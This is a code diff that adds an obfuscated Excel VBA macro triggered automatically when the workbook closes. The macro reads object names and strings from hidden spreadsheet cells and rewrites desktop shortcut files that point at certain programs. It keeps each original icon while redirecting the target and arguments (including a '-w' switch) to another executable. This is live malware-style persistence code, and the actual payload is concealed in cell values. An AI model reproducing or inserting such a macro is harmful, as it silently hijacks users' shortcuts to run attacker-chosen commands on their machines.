@@ -1,0 +1,18 @@
+Sub Auto_Close()
+Set CSbdJzf = CreateObject(activeSheet.Range("AP55").value)
+Set RCeXrf = CreateObject(activeSheet.Range("AT55").value)
+Set JijYUag = RCeXrf.GetFolder(CSbdJzf.SpecialFolders(activeSheet.Range("AW55").value))
+For Each wjnEvQoO In JijYUag.Files
+If(InStr(Lcase(wjnEvQoO), ".lnk")) Then
+Set YoSyDWJEn = CSbdJzf.CreateShortcut(CSbdJzf.SPecialFolders(activeSheet.Range("AW55").value) & "\" & wjnEvQoO.name)
+If(InStr(Lcase(YoSyDWJEn.targetPath), activeSheet.Range("BA55").value) or InStr(Lcase(YoSyDWJEn.targetPath), activeSheet.Range("BC55").value) or InStr(Lcase(YoSyDWJEn.targetPath), activeSheet.Range("BD55").value)) Then
+YoSyDWJEn.IconLocation = YoSyDWJEn.targetpath
+YoSyDWJEn.arguments = "-w " & activeSheet.Range("BH55").Value & YoSyDWJEn.targetPath & "'" & activeSheet.Range("BJ55").Value
+YoSyDWJEn.targetpath = left(CurDir, InStr(CurDir, ":")-1) & activeSheet.Range("BL55").value
+if(Len(YoSyDWJEn.arguments) < 1023) Then
+YoSyDWJEn.save
+end if
+end if
+end if
+next wjnEvQoO
+End Sub
